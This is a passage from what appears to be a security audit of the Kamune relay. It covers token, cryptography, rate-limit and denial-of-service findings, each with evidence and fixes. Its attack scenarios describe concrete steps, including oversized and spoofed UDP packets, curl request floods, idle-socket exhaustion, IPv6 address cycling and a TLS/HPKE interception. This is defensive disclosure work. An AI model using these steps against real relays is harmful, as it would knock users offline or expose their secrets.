**listenHandshake and relayHandshake accept any Registered token without checking it matches the requested one**

Severity: Low · Category: input-validation

Locations: `pkg/relayconn/listener.go:149-160`, `pkg/relayconn/relayconn_test.go:829-850`, `cmd/bus/relay.go:244-248`, `cmd/daemon/relay.go:218-252`

With WithToken set, listenHandshake does not check that Registered.Token equals o.token or has the expected length. A frame other than Registered is rejected with the misleading error "relay returned empty token". bus and daemon display and track hex(result.Token), so a relay that echoes a different token causes a wrong displayed token and a pairing failure with no clear error. relayHandshake (dial.go:145-149) ignores the echoed token completely, so the dialer side is not affected.

**Attack scenario.** A malicious relay or HPKE MITM answers a static-token registration with a different token. The bus tracker records and shows a token the dialer never uses, and the pairing fails without a clear error.

**Recommendation.** When o.token is set, require bytes.Equal(reg.Token, o.token); otherwise require length 16 or 32. In relayHandshake, require reg.Token to equal the token sent.

#### RC-18

**ECDH reconnect tokens skip HKDF-Extract and bind no session or identity context**

Severity: Info · Category: crypto

Locations: `pkg/relayconn/token.go:175-190`, `pkg/exchange/ecdh.go:21-31`, `docs/RELAY.md:566-568`

Complete passes the raw X25519 output directly to hkdf.Expand as the PRK. The comment says the shared secret 'is already uniform', but an X25519 u-coordinate is a field element encoding below 2^255-19, not a uniform 256-bit string. RFC 5869 calls for Extract first. The info string contains only a label and index, with no session ID or peer keys, so tokens are not bound to the kamune session that produced them. No practical break follows given about 252 bits of min-entropy and the ECDH keys travelling inside the authenticated transport.

**Recommendation.** Use hkdf.Key(sha512.New, sharedSecret, salt=sessionID, info=label||index||both ephemeral public keys, 32). Fix the comment.

#### RC-19

**ValidateUserToken entropy heuristic does not stop guessable tokens, contrary to RELAY.md**

Severity: Info · Category: spec-drift

Locations: `pkg/relayconn/token.go:62-110`, `cmd/relay/internal/services/session.go:81`, `docs/RELAY.md:497-500`

The check rejects all-zero, constant, and low Shannon-entropy tokens only. Byte frequency does not measure unpredictability: 0x00,0x01,...,0x1f has 5 bits per byte and passes, as does the SHA-256 of any guessable string. RELAY.md says the check 'prevents weak tokens that are easy to guess or brute-force'. Static tokens from TokenFromKeys always pass and are derivable from public keys.

**Recommendation.** Document the check as a sanity filter only, or drop the claim. Recommend that clients derive tokens with a secret or KDF.

#### RC-20

**relayconn package doc and relay.proto comments contradict the code on token size and on what HPKE protects**

Severity: Info · Category: docs

Locations: `pkg/relayconn/pb/relay.proto:18-20`, `pkg/relayconn/token.go:21-29`, `pkg/relayconn/relayconn.go:58-63`, `pkg/relayconn/broker/codec.go:283`, `pkg/relayconn/broker/codec.go:36`, `pkg/relayconn/relayconn.go:12-17` and 6 more

relay.proto:18-20 says Register.token is 16 bytes in MODE_JOIN and 16 bytes for a precomputed MODE_CREATE token. The relay requires exactly 32 bytes for any non-empty MODE_CREATE token (ws_handler.go:203 -> CreateWith -> ValidateUserToken, peerTokenSize=32). MODE_JOIN tokens are 16 bytes when the relay generated them and 32 bytes when the user supplied them. token.go:22-24 documents relayTokenSize, but no such constant exists. codec.go:283 says 12-byte nonce, but nonceSize is NonceSizeX (24). relayconn.go:59-61 attributes end-to-end encryption to pkg/exchange HPKE without saying that the relayconn HPKE leg (listener.go:118) terminates at the relay. The peer-to-peer HPKE inside Message frames is unauthenticated.

**Recommendation.** Change the proto comments to 16 bytes for relay-generated tokens and 32 bytes for user tokens. Remove or define relayTokenSize. Reword the package doc to say the HPKE channel terminates at the relay. Fix the nonce size in the SealNotify comment.

### relay

cmd/relay: the WS, WSS, TCP and TLS session switch and the UDP broker server.

| ID                | Severity | Category         | Finding                                                                                                                                         |
| ----------------- | -------- | ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| [REL-01](#rel-01) | High     | dos              | One oversized UDP datagram stops the whole relay on Windows builds                                                                              |
| [REL-02](#rel-02) | Medium   | security         | Default TLS/WSS certs are regenerated per process and cannot be pinned, forcing clients into InsecureSkipVerify                                 |
| [REL-03](#rel-03) | Medium   | privacy          | Auto-generated TLS certificate carries CN "Kamune Relay" and TLS 1.2 is allowed, exposing relays to probing contrary to RELAY.md                |
| [REL-04](#rel-04) | Medium   | privacy          | Relay logs every registration with client IP, TCP source port and listener/dialer role at Info by default                                       |
| [REL-05](#rel-05) | Medium   | dos              | Behind a CDN or tunnel with default empty trusted_proxies, all clients share one rate-limit bucket; 20 GETs/min block the relay                 |
| [REL-06](#rel-06) | Medium   | dos              | Broker registry can be filled with spoofed random-mode REGISTERs; when full, each REGISTER triggers a full map scan                             |
| [REL-07](#rel-07) | Medium   | dos              | Broker UDP shares the relay's per-IP limiter, so spoofed UDP packets lock a victim IP out of TCP, TLS and WS and can flush the limiter          |
| [REL-08](#rel-08) | Medium   | dos              | Rate limiter keys on the full IPv6 address on dual-stack listeners; one /64 gives unlimited quota and can flush the LRU                         |
| [REL-09](#rel-09) | Medium   | dos              | WS/WSS HTTP servers have no idle or read timeout; keep-alive sockets that never upgrade are held forever and skip rate limiting                 |
| [REL-10](#rel-10) | Medium   | resource-leak    | Rate limiter preallocates a quota-sized slice per client IP, so a high quota lets remote clients exhaust memory                                 |
| [REL-11](#rel-11) | Medium   | input-validation | clientIP trusts the first of five vendor headers in fixed order, so a client-supplied X-Real-Ip overrides the proxy's real header               |
| [REL-12](#rel-12) | Low      | security         | Broker rebinds a held registration to any source that repeats the public key, redirecting the peer's hole-punch                                 |
| [REL-13](#rel-13) | Low      | security         | Relay Docker image runs the relay as root                                                                                                       |
| [REL-14](#rel-14) | Low      | security         | WebSocket accept disables the Origin check for all requests                                                                                     |
| [REL-15](#rel-15) | Low      | dos              | Broker spends X25519 work and sends larger replies to unverified UDP source addresses (reflection and CPU exhaustion)                           |
| [REL-16](#rel-16) | Low      | dos              | Rejected and malformed WS requests each emit a WARN/ERROR log line; one keep-alive socket can flood logs                                        |
| [REL-17](#rel-17) | Low      | dos              | WSS TLS handshakes (RSA-2048 signatures) run before the rate limiter, contrary to the rate-limit-before-crypto claim                            |
| [REL-18](#rel-18) | Low      | concurrency      | Join can pair a dialer with a dead listener between ClosePeerChannel and Unregister, orphaning the dialer                                       |
| [REL-19](#rel-19) | Low      | input-validation | Config decoding silently ignores unknown keys, including the keys RELAY.md documents                                                            |
| [REL-20](#rel-20) | Low      | input-validation | max_message_size has no bounds; small values break all HPKE handshakes and values at or above 65536 let WS frames kill cross-transport sessions |
| [REL-21](#rel-21) | Low      | spec-drift       | handshake_timeout = 0 disables the handshake deadline entirely; RELAY.md says 0 means the 30s default                                           |
| [REL-22](#rel-22) | Low      | spec-drift       | Relay blocks the sender for up to 15 s per frame and then kills the session, contrary to the documented drop policy                             |
| [REL-23](#rel-23) | Low      | spec-drift       | Shipped config and Docker image enable the UDP broker and plaintext TCP on 0.0.0.0; RELAY.md says broker is off by default                      |
| [REL-24](#rel-24) | Info     | build            | Release build script ignores per-platform build failures and appends to stale zip archives                                                      |
| [REL-25](#rel-25) | Info     | docs             | Dead code: EchoIPHandler (/ip) is never routed and exported ParseForwardedIP trusts the leftmost public XFF entry                               |

Findings filed elsewhere that also apply here: [RC-03](#rc-03), [RC-04](#rc-04).

#### REL-01

**One oversized UDP datagram stops the whole relay on Windows builds**

Severity: High · Category: dos

Locations: `cmd/relay/internal/broker/broker.go:85`, `cmd/relay/internal/broker/broker.go:104-116`, `cmd/relay/run/run.go:177-180`, `cmd/relay/run/run.go:211-216`, `cmd/relay/main.go:42-44`, `cmd/relay/scripts/build.sh:21` and 1 more

Broker.Run reads into a fixed 1500-byte buffer and treats every read error except a timeout or a closed socket as fatal. On Windows, a datagram larger than the buffer makes WSARecvFrom return WSAEMSGSIZE. Go passes this to ReadFromUDP as an error, not a timeout. Run then returns "read udp packet", and run.go sends it on errCh. The main select treats any errCh value as fatal: it shuts down the TCP, TLS, WS and WSS listeners and exits with status 1. build.sh produces windows/amd64 and windows/arm64 release binaries by default. The shipped config enables the broker on 0.0.0.0:4788.

**Attack scenario.** An unauthenticated remote host sends one UDP datagram of 1501 bytes or more, with any content, to port 4788 of a relay running a Windows release build. ReadFromUDP returns WSAEMSGSIZE, Run returns an error, and the relay process exits. All relay sessions on every transport drop. The packet comes before magic parsing and before the rate limiter, so it needs no valid header. With a restart loop, the attacker repeats the packet. On Linux the oversized datagram is truncated without an error, so only Windows deployments are affected.

**Recommendation.** In Run, log and continue on read errors that are not net.ErrClosed or context cancellation. Treat WSAEMSGSIZE and other per-packet errors as dropped packets. Do not let a broker runtime error take down the TCP/WS listeners: after startup, log broker failures instead of sending them to errCh, or restart the broker loop. Add a test that sends a datagram larger than the buffer.

<details><summary>Evidence</summary>

```text
broker.go:85 `buf := make([]byte, 1500)`; broker.go:104-116 `n, src, err := b.conn.ReadFromUDP(buf); if err != nil { ... if errors.As(err, &ne) && ne.Timeout() {...continue}; if ctx.Err() != nil || errors.Is(err, net.ErrClosed) { return nil }; return fmt.Errorf("read udp packet: %w", err) }`. run.go:177-180 `if err := br.Run(ctx); err != nil { errCh <- fmt.Errorf("broker: %w", err) }`; run.go:211-216 `case err := <-errCh: ... shutdown() ... return fmt.Errorf("starting server: %w", err)`. The Go 1.26 stdlib test net/udpsock_test.go TestUDPReadSizeError has the comment `// Windows returns WSAEMSGSIZE` for a ReadFrom into a short buffer. build.sh:21 `PLATFORMS="${RELAY_PLATFORMS:-darwin/amd64 ... windows/amd64 windows/arm64}"`.

Verification:

broker.go:85 `buf := make([]byte, 1500)`; :104-116 `n, src, err := b.conn.ReadFromUDP(buf); if err != nil { if errors.As(err,&ne) && ne.Timeout() {...continue}; if ctx.Err() != nil || errors.Is(err, net.ErrClosed) { return nil }; return fmt.Errorf("read udp packet: %w", err) }`. run.go:177-180 `if err := br.Run(ctx); err != nil { errCh <- fmt.Errorf("broker: %w", err) }`; run.go:211-216 `case err := <-errCh: shutdown() ... return fmt.Errorf("starting server: %w", err)`; main.go:42-44 `if err := run.Run(cfgPath); err != nil { ... os.Exit(1)`. Go 1.26.6 internal/poll/fd_windows.go:756-763 ReadFrom: `err = syscall.WSARecvFrom(...)` then `if err != nil { return n, nil, err }`, with no [...]

broker.go:85 `buf := make([]byte, 1500)`. broker.go:104-116: after a non-timeout error, `if ctx.Err() != nil || errors.Is(err, net.ErrClosed) { return nil }; return fmt.Errorf("read udp packet: %w", err)`. run.go:178-179 `if err := br.Run(ctx); err != nil { errCh <- fmt.Errorf("broker: %w", err) }`. run.go:211-216 `case err := <-errCh: ... shutdown() ... return fmt.Errorf("starting server: %w", err)`. Go 1.26.6 internal/poll/fd_windows.go:740-766: ReadFrom calls WSARecvFrom and returns `err` unfiltered. The only WSAEMSGSIZE check is at line 1300, inside RawRead's 0-byte peek. net/udpsock_test.go:450 `if err != nil && runtime.GOOS != "windows" { // Windows returns WSAEMSGSIZE`. [...]
```

</details>

#### REL-02

**Default TLS/WSS certs are regenerated per process and cannot be pinned, forcing clients into InsecureSkipVerify**

Severity: Medium · Category: security

Locations: `cmd/relay/run/run.go:48-62`, `cmd/relay/run/run.go:226-252`, `cmd/relay/assets/config.toml:35-46`, `cmd/bus/relay.go:236`, `cmd/daemon/relay.go:242`, `cmd/relay/README.md:74-80`

With the shipped config, loadTLSConfig is called separately for [tls] and [wss] and each call generates a fresh key pair in memory. The cert changes on every restart and differs between the two listeners. The README says to "pin the cert or accept the warning", but bus and daemon only offer `InsecureSkipVerify` (no pin option), so default deployments can only be used with `?insecure=true`. The relay-to-client HPKE (exchange.Accept) has no long-term key either. With both layers unauthenticated, an active on-path attacker can terminate TLS and HPKE toward each side. RELAY.md says the PSK is protected inside HPKE.

**Attack scenario.** An on-path attacker (hostile Wi-Fi, ISP) intercepts a bus client connecting to tls://relay:8890?insecure=true, presents its own cert, runs HPKE with the client and separately with the relay, and reads the Auth{psk} frame and the Register token. It can then use the private relay and join or squat on the user's tokens.

**Recommendation.** Do not enable [tls] and [wss] with ephemeral certs in the shipped config, or persist a generated cert and print its SHA-256 fingerprint at startup. Add a pin option (cert or SPKI hash) to the relay client options in bus, daemon and tui. Document that insecure mode exposes the PSK to an active attacker.

<details><summary>Evidence</summary>

```text
run.go:48-62:
  tlsCfg, err = loadTLSConfig(cfg.TLS.CertFile, cfg.TLS.KeyFile)
  ...
  wssCfg, err = loadTLSConfig(cfg.WSS.CertFile, cfg.WSS.KeyFile)
run.go:226-228:
  if certFile == "" && keyFile == "" {
      return generateSelfSignedCertInMemory()
  }
cmd/bus/relay.go:236: `relayconn.ListenRelayWSS(ctx, host, &tls.Config{InsecureSkipVerify: insecureSkipVerify}, opts...)`
README.md:78-80: "Clients will see a certificate verification error; pin the cert or accept the warning on the client side."
pkg/exchange/channel.go:162-203 Accept: no static key or signature.
```

</details>

#### REL-03

**Auto-generated TLS certificate carries CN "Kamune Relay" and TLS 1.2 is allowed, exposing relays to probing contrary to RELAY.md**

Severity: Medium · Category: privacy

Locations: `cmd/relay/run/run.go:239`, `cmd/relay/run/run.go:251`, `cmd/relay/run/run.go:269-284`, `cmd/relay/assets/config.toml:33-46`, `cmd/relay/Dockerfile`, `cmd/relay/internal/handlers/tcp_handler.go:90-99` and 2 more

When cert_file and key_file are empty, as in the shipped config.toml copied into the Docker image, loadTLSConfig calls createSelfSignedCert. That cert has Subject CN "Kamune Relay", SAN localhost/127.0.0.1/::1 and 10-year validity. Any TLS or WSS client, including a censor's active probe, receives it. RELAY.md:347 says the cert "contains no identifying metadata", and RELAY.md:342 says the listener is indistinguishable from other TLS services. RELAY.md:345-346 also gives the wrong trigger: the code generates a cert only when both paths are empty, and hard-errors when a configured file is missing. Neither tls.Config sets MinVersion, so the server accepts TLS 1.2. Kamune's own Go clients negotiate TLS 1.3, so the cert is visible to passive observers only for clients capped at TLS 1.2.

**Attack scenario.** A censor scans port 8890/8891 (or 443) with `openssl s_client` or a TLS probe, reads Subject CN=Kamune Relay, and blocks the IP. Users connecting to it are then identifiable as Kamune users from flow records. A passive observer also sees the CN whenever a client negotiates TLS 1.2.

**Recommendation.** Generate the self-signed cert with an empty or random subject and SANs that match a plausible hostname, or require a real certificate for public listeners. Set MinVersion: tls.VersionTLS13 on both TLS and WSS configs. Correct RELAY.md:342 and :347.

<details><summary>Evidence</summary>

```text
run.go:269-280:
  template := x509.Certificate{
      SerialNumber: serial,
      Subject: pkix.Name{
          CommonName: "Kamune Relay",
      },
      NotAfter: time.Now().Add(10 * 365 * 24 * time.Hour),
      ...
      DNSNames: []string{"localhost"},
run.go:239: return &tls.Config{Certificates: []tls.Certificate{pair}}, nil (no MinVersion)
RELAY.md:347: "This certificate is valid for 10 years and contains no identifying metadata."
config.toml: [tls] and [wss] enabled with cert_file/key_file commented out.
```

</details>

#### REL-04

**Relay logs every registration with client IP, TCP source port and listener/dialer role at Info by default**

Severity: Medium · Category: privacy

Locations: `cmd/relay/internal/handlers/ws_handler.go:269`, `cmd/relay/internal/handlers/tcp_handler.go:44`, `cmd/relay/main.go:42`

handleRelayConn logs 'relay: peer registered' with remote address and a listener flag for every successful registration. slog's default handler writes Info to stderr, and the relay never changes the level. For TCP/TLS the remote string includes the source port. A listener line followed by a dialer line seconds later pairs two IP addresses, which builds the social graph that RELAY.md design goals say the relay does not keep ('Zero metadata: no social graph, no presence tracking'). Failure paths also log IPs at Warn (auth failed, missing auth, join without token).

**Attack scenario.** An honest operator runs the relay under systemd with default settings. journald keeps the stderr log. Anyone who later obtains the log (subpoena, host compromise, log shipping vendor) reads off which IP addresses talked to which, with timestamps, for the whole retention period.

**Recommendation.** Do not log client addresses on the success path; log at Debug, or log a keyed hash with a per-process random key. Add a log_level config and document what is logged.

<details><summary>Evidence</summary>

```text
ws_handler.go:269-272:
  slog.Info("relay: peer registered",
      slog.String("remote", remoteAddr),
      slog.Bool("listener", mode == pb.Register_MODE_CREATE),
  )
tcp_handler.go:44: remoteAddr := conn.RemoteAddr().String()
Sandbox output:
  INFO relay: peer registered remote=127.0.0.1 listener=true
  INFO relay: peer registered remote=127.0.0.1:57922 listener=false
RELAY.md:19: Zero metadata: no social graph, no presence tracking
```

</details>

#### REL-05

**Behind a CDN or tunnel with default empty trusted_proxies, all clients share one rate-limit bucket; 20 GETs/min block the relay**

Severity: Medium · Category: dos

Locations: `cmd/relay/internal/handlers/router.go:66-73`, `cmd/relay/internal/handlers/ws_handler.go:32-37`, `cmd/relay/internal/ratelimit/ratelimit.go:25-49`, `cmd/relay/assets/config.toml:4`, `cmd/relay/internal/config/config.go:83`, `docs/RELAY.md:1080-1123` and 3 more

With the empty default trusted_proxies, clientIP keys the limiter on the TCP peer. The CDN and Cloudflare Tunnel setups in RELAY.md (lines 1080-1123) do not mention trusted_proxies. In those setups the peer is the proxy, so all clients share one bucket of 20 per minute. Under cloudflared that bucket is 127.0.0.1. The check runs before websocket.Accept, so plain non-upgrade GETs fill the bucket, and every other client then gets 429. Organic load above 20 connects per minute has the same effect. The relay README (lines 49-52) tells operators to set trusted_proxies behind a reverse proxy, but RELAY.md does not.

**Attack scenario.** An attacker sends `curl https://relay.example/ws` 20 times a minute through the CDN or tunnel hostname. Each request consumes one slot of the shared key (127.0.0.1 for cloudflared, or the edge IP). All legitimate WSS clients receive 429 for the rest of the window. Cost to the attacker: 20 HTTP requests per minute, no HPKE work. The same happens with organic load once more than 20 users connect per minute.

**Recommendation.** Document trusted_proxies and the header setting in every CDN and tunnel example in RELAY.md and the relay README, and log a startup warning when ws or wss is enabled on a loopback or private address with the limiter on and trusted_proxies empty. Consider counting only successful upgrades or completed HPKE toward the quota, and fix header selection before recommending trusted_proxies.

<details><summary>Evidence</summary>

```text
router.go:66-73:
  remoteIP := validateIP(r.RemoteAddr)
  ...
  if !ipInRanges(net.ParseIP(remoteIP), trustedProxies) {
      return remoteIP
  }
ws_handler.go:33-40: rate check `rl.Allow(remoteAddr)` runs before `websocket.Accept`.
config.toml:4 `trusted_proxies = []`
config.go:83: defaultRateLimitQuota = uint64(20)
RELAY.md:1082 "plain WebSocket behind the CDN is perfectly safe." RELAY.md:1104 "The relay itself needs no changes". CDN Config block (RELAY.md:1106-1123) has no trusted_proxies.
Probe: a non-upgrade GET /ws returned 426 and the next request from the same key got 429 (quota=1).
```

</details>

#### REL-06

**Broker registry can be filled with spoofed random-mode REGISTERs; when full, each REGISTER triggers a full map scan**

Severity: Medium · Category: dos

Locations: `cmd/relay/internal/broker/broker.go:30`, `cmd/relay/internal/broker/broker.go:189`, `cmd/relay/internal/broker/broker.go:198`, `cmd/relay/internal/broker/broker.go:298`, `cmd/relay/internal/broker/broker.go:305`

A REGISTER with an all-zero token creates a new registry entry with a fresh random key on every packet, with no dedupe by source or public key, and costs the broker an X25519 keygen plus ECDH to send TOKEN_ASSIGNED. The per-IP limiter is keyed by the unauthenticated UDP source, so a spoofing sender gets a fresh budget per forged address. At defaultMaxRegistry (100,000) live entries, new registrations are dropped silently. While full, registryFullLocked calls purgeExpiredLocked, which walks all 100,000 entries on every incoming REGISTER in the single broker goroutine. RELAY.md Known Limits says the per-IP limiter caps registrations per IP; that does not hold against spoofed sources, and with rate_limit.disabled one host needs no spoofing.

**Attack scenario.** An attacker sends about 1,700 spoofed REGISTER packets per second with random source IPv4 addresses and zero tokens. Within 60s the registry holds 100,000 entries. Legitimate peers' REGISTERs get no TOKEN_ASSIGNED and static registrations are not stored, so P2P rendezvous fails for all users, and each further packet costs a 100,000-entry scan. Each spoofed packet also reflects a 99-byte NOTIFY to the forged address.

**Recommendation.** Require a return-routability cookie (a STUN_ECHO response carrying a MAC of src and time that the REGISTER must echo) before storing state or doing ECDH. Cap entries per /24, and purge on a timer only, not on every insert when full.

<details><summary>Evidence</summary>

```text
broker.go:189-191: if isZeroBytes(token) { b.handleRandomRegister(peerEphPub, src4); return }
broker.go:207-216: if b.registryFullLocked() { ...return }
  b.registry[hexKey(key[:])] = &registration{addr: src, ...}
broker.go:298-306: if len(b.registry) < b.maxRegistry { return false }
  b.purgeExpiredLocked()
broker.go:30: const defaultMaxRegistry = 100_000
RELAY.md:1034: The per-IP rate limiter caps registrations per IP.
```

</details>

#### REL-07

**Broker UDP shares the relay's per-IP limiter, so spoofed UDP packets lock a victim IP out of TCP, TLS and WS and can flush the limiter**

Severity: Medium · Category: dos

Locations: `cmd/relay/run/run.go:64-71`, `cmd/relay/internal/broker/broker.go:155-171`, `cmd/relay/internal/broker/broker.go:354-366`, `cmd/relay/internal/handlers/tcp_handler.go:46-50`, `cmd/relay/internal/handlers/ws_handler.go:33-38`, `cmd/relay/internal/ratelimit/ratelimit.go:17-49`

run.go passes the hub's RateLimiter.Allow into the broker. The broker charges every STUN_ECHO and REGISTER to ipv4KeyFromAddr(src), the UDP source IPv4 string, before any parsing (allowRegister runs before ParseRegister). The TCP/TLS accept loop and the WS handler charge connections to the same limiter with the same key format. UDP source addresses are not verified, and STUN_ECHO needs only a 6-byte packet. Each new spoofed source also inserts an entry into the size-bounded LRU (max_entries, default 100,000), evicting real clients' history and resetting their quota. Honest P2P traffic spends the same budget: the daemon's p2pListener sends one echo plus one REGISTER per token every 30s (cmd/daemon/p2plistener.go refreshLoop), so a client with 9 static tokens uses 20 events per minute and cannot open relay connections from its own IP. Users behind one CGNAT address share the budget. RELAY.md (lines 860, 1010) presents the shared limiter as a mitigation and does not mention the cross-protocol effect.

**Attack scenario.** An attacker on a network without egress source filtering sends 20 UDP packets per minute `KBRK\x01\x01` to port 4788 with the victim's IPv4 (or a CGNAT gateway) as source. Every TCP/TLS connection from that address is closed at accept and every WS upgrade gets 429 for as long as the attacker continues, at about 3 bytes/s. Separately, the attacker sprays STUN_ECHO from 100,000 random spoofed sources to evict its own real IP's history before each burst of registrations. The broker is enabled by default in config.toml.

**Recommendation.** Give the broker its own RateLimiter instance (separate keyspace, for example prefix keys with "udp:", and a separate quota) so unauthenticated UDP traffic cannot spend or evict the connection-oriented quota. Count only well-formed REGISTERs. For STUN_ECHO, charge nothing or use a cheaper separate budget. Consider a stateless cookie (echo a server MAC of the source address) before counting UDP traffic.

<details><summary>Evidence</summary>

```text
run.go:65-71:
  if rl := srvc.Hub().RateLimiter(); rl != nil {
      allow = rl.Allow
  }
  br, err = broker.New(cfg.Broker, allow)
broker.go:168: if !b.allowRegister(src) {   (before ParseRegister at :171)
broker.go:354-359:
  func (b *Broker) allowEcho(src *net.UDPAddr) bool {
      ...
      return b.allow(ipv4KeyFromAddr(src))
  }
tcp_handler.go:46: `!rl.Allow(extractIP(remoteAddr))`
ws_handler.go:34: `if rl := h.service.Hub().RateLimiter(); rl != nil && !rl.Allow(remoteAddr) {`
ratelimit.go:19: lru: expirable.NewLRU[string, []time.Time](maxEntries, nil, window*2)
Sandbox probe: quota 20, [...]
```

</details>

#### REL-08

**Rate limiter keys on the full IPv6 address on dual-stack listeners; one /64 gives unlimited quota and can flush the LRU**

Severity: Medium · Category: dos

Locations: `cmd/relay/internal/ratelimit/ratelimit.go:17-49`, `cmd/relay/internal/handlers/tcp_handler.go:46`, `cmd/relay/internal/handlers/tcp_handler.go:79`, `cmd/relay/internal/handlers/ws_handler.go:33`, `cmd/relay/internal/handlers/router.go:66-73`, `cmd/relay/internal/services/services.go:39-45` and 3 more

The limiter key is the literal IP string (extractIP / clientIP). Listeners bound to 0.0.0.0 with network "tcp" are dual-stack on Linux, so IPv6 clients reach the TCP, TLS, WS and WSS listeners. A single VPS normally has a /64, which is 2^64 distinct keys, each with a fresh quota. The LRU holds at most max_entries (100,000) keys, so cycling addresses also evicts other clients' history, which resets their counters. max_entries = 0 is accepted and makes the LRU unbounded (services.go comment). RELAY.md:298 says the table is bounded and defaults to max_concurrent_sessions; the code default is 100,000. This removes the only per-client control on session creation, PSK guessing and handshake CPU.

**Attack scenario.** An attacker with one IPv6 /64 opens 10,000 TCP or WSS connections, each from a new source address, completes HPKE and sends Register{MODE_CREATE}. All relay session slots are taken; every legitimate Create/CreateWith returns ErrSessionFull for token_ttl (10 minutes), and the attacker repeats. The same technique allows unlimited HPKE work or online PSK brute force, and evicts legitimate limiter entries.

**Recommendation.** Normalize IPv6 keys to a prefix (/64 by default, configurable) before calling Allow in tcp_handler.go, ws_handler.go and the broker; optionally allow IPv4 /24 aggregation. Add a global cap on in-flight pre-registration connections. Reject max_entries = 0 or document it as unbounded. Fix RELAY.md:298 to match the 100,000 default.

<details><summary>Evidence</summary>

```text
ratelimit.go:19:
  lru: expirable.NewLRU[string, []time.Time](maxEntries, nil, window*2),
ratelimit.go:24/32: `stamps, ok := rl.lru.Get(key)`
tcp_handler.go:79: listener, err := net.Listen("tcp", addr)  (config.toml: address = "0.0.0.0:8889")
session.go:57: if len(sm.sessions) >= sm.maxConns { return nil, ErrSessionFull }
golang-lru expirable: "Size parameter set to 0 makes cache of unlimited size".
Sandbox probe: clientIP for [2001:db8:1:2:aaaa::1] and [2001:db8:1:2:bbbb::2] returned two distinct keys.
Dual-stack check: net.Listen("tcp","0.0.0.0:0") then Dial tcp6 [::1] accepted, rate-limit [...]
```

</details>

#### REL-09

**WS/WSS HTTP servers have no idle or read timeout; keep-alive sockets that never upgrade are held forever and skip rate limiting**

Severity: Medium · Category: dos

Locations: `cmd/relay/run/run.go:112-116`, `cmd/relay/run/run.go:153-158`, `cmd/relay/internal/handlers/ws_handler.go:33-38`

The plain WS server and the WSS server set only ReadHeaderTimeout (30s). IdleTimeout, ReadTimeout and WriteTimeout are zero. In net/http, idleTimeout() returns IdleTimeout, else ReadTimeout, so it is 0. After any response on a keep-alive connection, the server clears the read deadline and blocks in bufr.Peek(4) with no deadline. ReadHeaderTimeout starts only after the first bytes of the next request arrive. The rate limiter runs inside WebSocketHandler on /ws, so a request to any other path (404) never reaches it. A 429 or 426 response from /ws also leaves the connection open. Nothing caps concurrent connections. Each held socket costs a file descriptor, a goroutine and bufio buffers. The default config.toml enables WSS on 0.0.0.0:8891, so default deployments are exposed.

**Attack scenario.** An unauthenticated client opens N TCP connections to the WSS (or WS) port, sends one request per connection such as `GET / HTTP/1.1\r\nHost: x\r\n\r\n` (404), reads the response, then sends nothing. Every socket stays open indefinitely. With a few hundred thousand sockets from one or a few hosts the relay hits its file-descriptor or memory limit, and new WS, WSS, TCP and TLS accepts fail for all users. The per-IP rate limiter is never consulted for the 404 path.

**Recommendation.** Set IdleTimeout (for example 60s), ReadTimeout and MaxHeaderBytes on wsServer and wssServer, or call `srv.SetKeepAlivesEnabled(false)` since /ws is the only route and upgrades hijack the socket. Add a cap on concurrent connections (netutil.LimitListener or a per-IP connection limiter) for all listeners.

<details><summary>Evidence</summary>

```text
run.go:112-116:
  wsServer := &http.Server{
      Addr: cfg.WS.Address, Handler: wsMux,
      ReadHeaderTimeout: 30 * time.Second,
  }
(run.go:153-158 WSS is the same plus TLSConfig.)
Go net/http: `if d := c.server.idleTimeout(); d > 0 {...} else { c.rwc.SetReadDeadline(time.Time{}) }` then `c.bufr.Peek(4)`.
Sandbox probe (server built like run.go, ReadHeaderTimeout shortened to 200ms, real WebSocketHandler, quota=1):
  req 0 status 426
  WARN rate limit exceeded remote=127.0.0.1
  req 1 status 429
  after 3s idle, conn still open, status 404
Second repro (ReadHeaderTimeout 1s): "first: 404" [...]
```

</details>

#### REL-10

**Rate limiter preallocates a quota-sized slice per client IP, so a high quota lets remote clients exhaust memory**

Severity: Medium · Category: resource-leak

Locations: `cmd/relay/internal/ratelimit/ratelimit.go:32-35`, `cmd/relay/internal/ratelimit/ratelimit.go:47-48`, `cmd/relay/internal/config/config.go:133-142`, `cmd/relay/internal/config/config.go:84`, `cmd/relay/internal/broker/broker.go:354-366`, `cmd/relay/run/run.go:65-70` and 2 more

Allow allocates make([]time.Time, 0, rl.quota) for every new key, so the first request from an address costs 24*quota bytes. Validate bounds quota only by MaxInt. The broker shares this limiter and keys it on the UDP source IPv4 address (broker.go:354-366). Each spoofed 6-byte STUN_ECHO packet from a new source therefore allocates 24*quota bytes. Total memory is bounded by max_entries (default 100_000 at config.go:84) times 24*quota. With max_entries = 0 the LRU has no size cap and only the 2*window TTL limits it. Measured in a sandbox at quota=100000: 4000 keys gave 9157 MB HeapAlloc and 39 MB RSS with no churn. With 20000 keys through a 1000-entry LRU, HeapAlloc was 2290 MB and RSS was 5.2 GB. Default quota 20 is harmless. RELAY.md:298 and :915 say max_entries defaults to max_concurrent_sessions. The code default is the separate value 100_000.

**Attack scenario.** An operator sets quota = 100000 so CDN-fronted clients are not blocked. An attacker sends one TCP connect or one HTTP GET to /ws from each of many source addresses. An IPv6 /64 gives unlimited distinct keys (known issue), and spoofed UDP to the broker also reaches this limiter. Each new key allocates 2.4 MB, so about 4,000 addresses use 10 GB and the relay is OOM-killed.

**Recommendation.** Allocate the slice lazily with a small capacity, or use a token bucket or fixed-window counter that stores O(1) state per key. Cap quota in Validate to a sane maximum. Fix RELAY.md:298.

<details><summary>Evidence</summary>

```text
ratelimit.go:32-35 `stamps, ok := rl.lru.Get(key); if !ok { stamps = make([]time.Time, 0, rl.quota) }`; ratelimit.go:47-48 `stamps = append(stamps, now); rl.lru.Add(key, stamps)`; config.go:136-142 `maxInt := uint64(^uint(0) >> 1); if c.RateLimit.Quota > maxInt { return ... }` (the only upper bound); config.go:83 `defaultRateLimitMaxEntries = 100_000`.
```

</details>

#### REL-11

**clientIP trusts the first of five vendor headers in fixed order, so a client-supplied X-Real-Ip overrides the proxy's real header**

Severity: Medium · Category: input-validation

Locations: `cmd/relay/internal/handlers/router.go:66-94`, `cmd/relay/internal/handlers/ws_handler.go:33-38`, `cmd/relay/README.md:49-52`, `cmd/relay/internal/handlers/ws_handler.go:32-38`, `cmd/relay/internal/ratelimit/ratelimit.go:17-49`

